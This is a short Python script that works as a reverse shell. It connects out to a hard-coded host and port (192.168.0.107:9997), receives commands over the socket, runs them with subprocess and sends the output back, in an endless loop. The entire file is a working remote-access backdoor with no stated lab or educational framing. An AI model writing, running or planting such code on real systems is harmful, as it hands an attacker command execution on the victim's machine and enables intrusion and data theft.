import os
import socket
import subprocess


host = "192.168.0.107"
port = 9997


sock = socket.socket()
sock.connect((host, port))


def run_process(command: str):
    try:
        result = subprocess.run(command.split(), check=True, stdout=subprocess.PIPE)
        return result.stdout.decode()
    except OSError as e:
        return str(e)
    except subprocess.CalledProcessError as e:
        return str(e)


while True:
    data = sock.recv(1024)
    process_output = run_process(data)
    print(process_output)
    sock.send(str.encode(process_output))
